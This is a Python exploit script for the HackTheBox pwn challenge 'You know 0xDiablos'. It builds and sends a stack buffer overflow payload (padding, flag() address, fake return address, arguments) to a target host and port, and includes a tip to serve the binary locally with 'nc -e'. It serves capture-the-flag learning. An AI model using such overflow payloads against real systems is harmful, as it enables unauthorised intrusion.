#!/usr/bin/python3
# https://github.com/7own

"""
HackTheBox challenge
--------------------

Category:    Pwn
Name:        You know 0xDiablos
Difficulty:  Easy
Description: Buffer overflow on a binary without any protection (ASLR, DEP, PIE, etc...)
             This can be checked quickly using `checksec` (pwntools)
             The flag() should be called with 2 arguments.
             The arguments are stored in ESP+4, ESP+8, ESP+... (and so on)
             The stack can be filled this way :
                 padding = b"A" * 188     # Fill until EIP
                 flag_addr = 0x080491e2   # Address of flag() in ESP+0
                 flag_fake_RET = b"BBBB" # Fake return address (for target_func to return to), will do a segfault once flag() return
                 flag_arg1 = 0xDEADBEEF # ARG 1 in ESP+4
                 flag_arg2 = 0xC0DED00D # ARG 2 in ESP+8
Tips: Run the binary using `nc 127.0.0.1 8080 -e ./vuln` and test the payload before testing online.
"""

import argparse
import socket,sys

#HOST = "94.237.123.233"
#PORT = 44946

def send(HOST, PORT, payload):
    print (f'[*] Connecting to {HOST}:{PORT}')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print (f'[*] Input from the socket:\n    {s.recv(1024)}\n')
    print (f'[*] Sending payload...')
    s.sendall(payload)
    s.sendall(b'\n')
    print ("[*] Flag:")
    print (s.recv(1024))

def generate_payload():
    """
So when ret is executed:
    Stack is adjusted: esp += 4, jumps to target_func
    Now esp points to "BBBB" (fake return address for target_func)
    [esp + 4] → 0xdeadbeef → becomes arg1
    [esp + 8] → 0x13371337 → becomes arg2
    """
    padding = b"A" * 188     # Fill until EIP
    flag_addr = 0x080491e2   # Address of flag()
    flag_fake_RET = b"BBBB" # Fake return address (for target_func to return to), will do a segfault once flag() return
    flag_arg1 = 0xDEADBEEF # ARG 1
    flag_arg2 = 0xC0DED00D # ARG 2

    payload = (padding + 
              flag_addr.to_bytes(4, "little") + 
              flag_fake_RET + #.to_bytes(4, "little") + 
              flag_arg1.to_bytes(4, "little") +
              flag_arg2.to_bytes(4, "little"))  # Little-endian


    print(f"[*] Writing payload\n    {payload.hex()}\n\n")
    f = open('./payload', 'wb')
    f.write(payload)
    f.close()

    return payload

def parse_args():
    parser = argparse.ArgumentParser(description="Simple script that accepts IP address and port number.")
    parser.add_argument("-i", "--ip", type=str, required=True, default="127.0.0.1", help="Target IP address (e.g., 192.168.1.10)")
    parser.add_argument("-p", "--port", type=int, required=True, default="8080", help="Target port number (e.g., 8080)")

    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    payload = generate_payload()
    send(args.ip, args.port, payload)
